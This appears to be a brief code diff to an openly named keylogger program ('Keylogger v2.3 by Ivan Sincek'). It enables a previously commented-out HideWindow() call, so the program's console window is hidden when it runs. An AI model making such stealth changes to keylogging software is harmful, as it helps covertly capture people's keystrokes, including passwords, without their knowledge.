@@ -250,7 +250,7 @@ void CreateHookThread() {
 }
 
 int main() {
-	// HideWindow();
+	HideWindow();
 	SetConsoleTitleA("Keylogger");
 	printf("Keylogger v2.3 by Ivan Sincek.\n");
 	printf("GitHub repository at github.com/ivan-sincek/keylogger.\n");
